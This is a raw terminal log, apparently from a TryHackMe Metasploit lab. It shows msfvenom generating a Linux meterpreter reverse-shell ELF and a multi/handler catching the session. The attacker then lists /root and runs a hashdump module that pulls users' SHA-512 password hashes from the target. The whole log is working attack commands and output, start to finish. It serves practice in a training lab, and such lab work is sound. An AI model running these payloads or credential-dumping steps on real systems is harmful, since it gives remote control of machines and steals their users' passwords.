```
┌──(kali㉿kali)-[~/…/THM/rooms/metasploit/exploitation]
└─$ msfvenom -p linux/x86/meterpreter_reverse_tcp -f elf LHOST=10.18.112.115 LPORT=4444 > rev_shell.elf
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 1106792 bytes
Final size of elf file: 1106792 bytes



msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload linux/x86/meterpreter_reverse_tcp
payload => linux/x86/meterpreter_reverse_tcp
msf6 exploit(multi/handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (linux/x86/meterpreter_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf6 exploit(multi/handler) > set LHOST 10.18.112.115
LHOST => 10.18.112.115
msf6 exploit(multi/handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (linux/x86/meterpreter_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.18.112.115    yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.18.112.115:4444 
[*] Meterpreter session 1 opened (10.18.112.115:4444 -> 10.10.178.168:55300 ) at 2022-06-04 20:14:37 +0530

meterpreter > ls
Listing: /root
==============

Mode              Size     Type  Last modified              Name
----              ----     ----  -------------              ----
100644/rw-r--r--  3106     fil   2018-04-09 16:40:28 +0530  .bashrc
040755/rwxr-xr-x  4096     dir   2021-08-12 16:09:37 +0530  .local
100644/rw-r--r--  148      fil   2015-08-17 21:00:33 +0530  .profile
040700/rwx------  4096     dir   2021-08-12 16:06:35 +0530  .ssh
100755/rwxr-xr-x  1106792  fil   2022-06-04 20:00:35 +0530  rev_shell.elf
040755/rwxr-xr-x  4096     dir   2021-08-12 16:09:26 +0530  snap

meterpreter > run post/linux/gather/hashdump

[+] murphy:$6$qK0Kt4UO$HuCrlOJGbBJb5Av9SL7rEzbxcz/KZYFkMwUqAE0ZMDpNRmOHhPHeI2JU3m9OBOS7lUKkKMADLxCBcywzIxl7b.:1001:1001::/home/murphy:/bin/sh
[+] claire:$6$Sy0NNIXw$SJ27WltHI89hwM5UxqVGiXidj94QFRm2Ynp9p9kxgVbjrmtMez9EqXoDWtcQd8rf0tjc77hBFbWxjGmQCTbep0:1002:1002::/home/claire:/bin/sh
[+] Unshadowed Password File: /home/kali/.msf4/loot/20220604201543_default_10.10.178.168_linux.hashes_462667.txt
meterpreter > quit
[*] Shutting down Meterpreter...

[*] 10.10.178.168 - Meterpreter session 1 closed.  Reason: User exit
```
